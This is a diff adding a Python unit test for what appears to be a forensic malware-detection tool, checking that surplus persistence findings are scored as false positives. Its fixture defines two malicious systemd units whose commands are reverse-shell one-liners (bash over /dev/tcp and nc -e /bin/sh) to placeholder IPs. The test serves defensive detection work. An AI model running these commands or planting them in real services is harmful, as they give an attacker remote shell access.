@@ -687,3 +687,53 @@ def test_scenario_report_f1_score_with_zero_values_returns_zero() -> None:
 
     # Assert
     assert f1 == 0.0
+
+
+def test_score_persistence_extras_count_as_false_positives(tmp_path: Path) -> None:
+    """A detector emitting MORE persistence findings than declared must score them
+    as false positives, not silently cap at the expected count (SFE-fibx.9.1).
+
+    The persistence count block only ever added tp/fn; without the fp branch a
+    hallucinated persistence finding would report precision=1.00. Here the fixture
+    holds TWO malicious systemd units while the manifest expects persistence: 1,
+    so the detector emits 2 findings -> 1 TP + 1 FP -> precision < 1.0.
+    """
+    import json
+
+    _write_manifest(
+        tmp_path,
+        "name: test_persistence_fp\n"
+        "tier: synthetic\n"
+        "fixtures:\n"
+        "  linux_artifacts: linux_artifacts.json\n"
+        "expected:\n"
+        "  finding_counts:\n"
+        "    persistence: 1\n",
+    )
+    (tmp_path / "linux_artifacts.json").write_text(
+        json.dumps(
+            {
+                "systemd_units": [
+                    {
+                        "path": "/etc/systemd/system/a.service",
+                        "exec_start": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+                    },
+                    {
+                        "path": "/etc/systemd/system/b.service",
+                        "exec_start": "nc -e /bin/sh 10.0.0.2 5555",
+                    },
+                ]
+            }
+        ),
+        encoding="utf-8",
+    )
+
+    from sift_find_evil.scenario_runner import run_scenario
+
+    manifest = load_scenario(tmp_path)
+    report = run_scenario(manifest)
+
+    assert "persistence" in report.false_positives
+    assert report.false_positives.count("persistence") == 1
+    assert report.precision < 1.0
+    assert report.passed is False
